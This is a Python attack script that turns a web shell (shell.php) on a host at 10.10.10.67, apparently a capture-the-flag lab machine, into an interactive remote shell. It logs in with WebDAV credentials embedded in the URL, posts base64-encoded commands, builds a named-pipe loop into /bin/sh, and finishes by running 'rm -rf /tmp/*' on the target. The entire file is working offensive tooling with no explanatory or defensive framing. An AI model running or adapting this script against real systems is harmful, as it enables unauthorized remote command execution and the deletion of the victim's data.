#!/bin/python3
import requests
import pdb
import base64
import random

main_url = "http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php"
archive = str(random.randint(1, 9999)); global stdin, stdout
stdin = "/tmp/" + archive + "in"; stdout = "/tmp/" + archive + "out"
parameter = "cmd"


def run(command):
	command = base64.b64encode(command.encode()).decode()
	data = { parameter : 'echo "%s" | base64 -d | bash ' % command }
	req = requests.post(main_url, data=data, timeout=5)
	return req.text

def write(command):
    command = base64.b64encode(command.encode()).decode()
    data = { parameter : 'echo "%s" | base64 -d > %s' % (command, stdin) }
    req = requests.post(main_url, data=data, timeout=2)
    return req.text

def read(command):
	read_output = "/bin/cat " + stdout
	res = run(read_output)
	return res

def setup():
	fifo = "mkfifo " + stdin + "; tail -f " + stdin + " | /bin/sh 2>&1 > " + stdout
	try:
		run(fifo)
	except:
		None
	return None	

setup()
command = None
while command != "salir":
	command = input("~$: ")
	write(command + "\n")
	res = read(command)
	print(res)
	clear = "echo '' > " + stdout
	run(clear)
run("rm -rf /tmp/*")

